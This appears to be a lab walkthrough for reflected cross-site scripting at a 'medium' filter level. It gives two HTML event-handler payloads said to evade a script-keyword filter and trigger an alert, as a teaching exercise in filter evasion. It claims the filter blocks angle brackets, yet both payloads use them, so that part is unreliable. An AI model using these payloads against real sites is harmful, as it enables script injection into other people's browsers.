⚡ Reflected XSS – Medium Security Level

### 🛠️ Objective:
Bypass simple filters and inject working JavaScript via user input.

---

### 🔍 What’s New?

- The application now applies **basic filtering** on characters like:
  - `<`, `>`, `"` and `script`
- Direct injection using `<script>` may be blocked.

---

### 🧪 Bypass Techniques

Try input like:
```html
<img src=x onerror=alert(1)>
````

✅ The payload bypasses the filter and triggers an alert box.

---

### 🧭 Walkthrough

1. Enter a filtered payload such as:

```html
<svg/onload=alert(1)>
```

2. Submit the form.

✅ Alert will still execute, proving the XSS is still possible.

---

### 🧩 Summary

* ⚠️ Basic filter in place (e.g., blocking `<script>`)
* ✅ Still vulnerable using creative payloads
* 🟡 Good for learning filter evasion

## ✅ Status

* ✅ Fully exploitable
* 🟡 Intermediate
